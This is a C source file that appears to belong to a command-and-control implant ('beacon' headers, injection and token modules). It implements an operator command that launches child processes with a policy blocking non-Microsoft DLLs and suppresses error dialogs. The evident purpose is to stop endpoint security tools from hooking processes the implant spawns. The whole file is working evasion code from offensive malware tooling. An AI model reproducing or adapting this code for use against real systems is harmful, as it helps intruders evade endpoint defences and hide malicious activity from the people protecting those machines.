#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"

#include "process.h"

/* some constants that our compiler does not have */
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ui64 << 44)

#define ProcThreadAttributeMitigationPolicy 7
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY \
		ProcThreadAttributeValue (ProcThreadAttributeMitigationPolicy, FALSE, TRUE, FALSE)

/* spawn ppid */
BOOL blockdlls = FALSE;

void command_blockdlls(char * buffer, int length) {
	datap parser;

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* do we want to block DLLs. :) */
	if (data_int(&parser) == 0)
		blockdlls = FALSE;
	else
		blockdlls = TRUE;
}

/* set the attribute to block DLLs, thanks */
BOOL process_blockdlls_pre(void * thisp, int ppid, void * pattr, void * siptr) {
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)pattr;
	EX_ATTR_MOD *               mods           = (EX_ATTR_MOD *)thisp;

	/* argument address needs to stay in scope until thread proc list is destroyed */
	mods->parg = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &(mods->parg), sizeof(DWORD64), NULL, NULL)) {
		post_error_d(0x47, GetLastError());
		return FALSE;
	}

	if (SetErrorMode != NULL)
		mods->oerr = SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

	return TRUE;
}

void process_blockdlls_post(void * thisp) {
	EX_ATTR_MOD *               mods = (EX_ATTR_MOD *)thisp;
	if (SetErrorMode != NULL)
		SetErrorMode(mods->oerr);
}

EX_ATTR_MOD process_blockdlls() {
	EX_ATTR_MOD result;
	result.pre = process_blockdlls_pre;
	result.post = process_blockdlls_post;
	return result;
}
